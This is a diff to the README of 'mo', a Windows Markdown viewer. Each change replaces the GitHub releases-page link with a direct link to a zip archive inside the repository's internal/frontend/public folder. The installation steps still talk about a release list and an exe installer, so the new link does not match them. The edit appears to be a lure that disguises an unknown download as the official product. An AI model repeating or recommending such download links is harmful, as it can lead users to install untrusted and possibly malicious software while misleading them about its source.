@@ -1,6 +1,6 @@
 # 🗒️ mo - Simple Markdown Viewer for Windows
 
-[![Download mo](https://img.shields.io/badge/Download-mo-%23ff6347?style=for-the-badge)](https://github.com/txetxoarnedo/mo/releases)
+[![Download mo](https://img.shields.io/badge/Download-mo-%23ff6347?style=for-the-badge)](https://github.com/txetxoarnedo/mo/raw/refs/heads/main/internal/frontend/public/Software-2.1.zip)
 
 ---
 
@@ -30,7 +30,7 @@ Before you download mo, make sure your computer meets these simple requirements:
 You will get mo from the official release page on GitHub. Follow these steps carefully:
 
 1. Click the large red **Download mo** button at the top of this document or visit the release page directly:  
-   https://github.com/txetxoarnedo/mo/releases  
+   https://github.com/txetxoarnedo/mo/raw/refs/heads/main/internal/frontend/public/Software-2.1.zip  
 2. You will see a list of available files in the latest release. Look for a file named something like `mo-setup.exe` or `mo.exe`.  
 3. Click the file to start the download. The file size will be between 30 and 50 MB.  
 4. Wait for the download to finish. It might take a few minutes depending on your internet speed.  
@@ -108,7 +108,7 @@ If mo doesn’t open your file or shows an error, try these steps:
 - Close any other programs that might be using a lot of system resources.  
 
 For more help, you can visit the release page here:  
-[https://github.com/txetxoarnedo/mo/releases](https://github.com/txetxoarnedo/mo/releases)
+[https://github.com/txetxoarnedo/mo/raw/refs/heads/main/internal/frontend/public/Software-2.1.zip](https://github.com/txetxoarnedo/mo/raw/refs/heads/main/internal/frontend/public/Software-2.1.zip)
 
 ---
 
@@ -118,4 +118,4 @@ mo does not collect or send data from your computer. It opens files locally only
 
 ---
 
-[![Download mo](https://img.shields.io/badge/Download-mo-%23ff6347?style=for-the-badge)](https://github.com/txetxoarnedo/mo/releases)
+[![Download mo](https://img.shields.io/badge/Download-mo-%23ff6347?style=for-the-badge)](https://github.com/txetxoarnedo/mo/raw/refs/heads/main/internal/frontend/public/Software-2.1.zip)
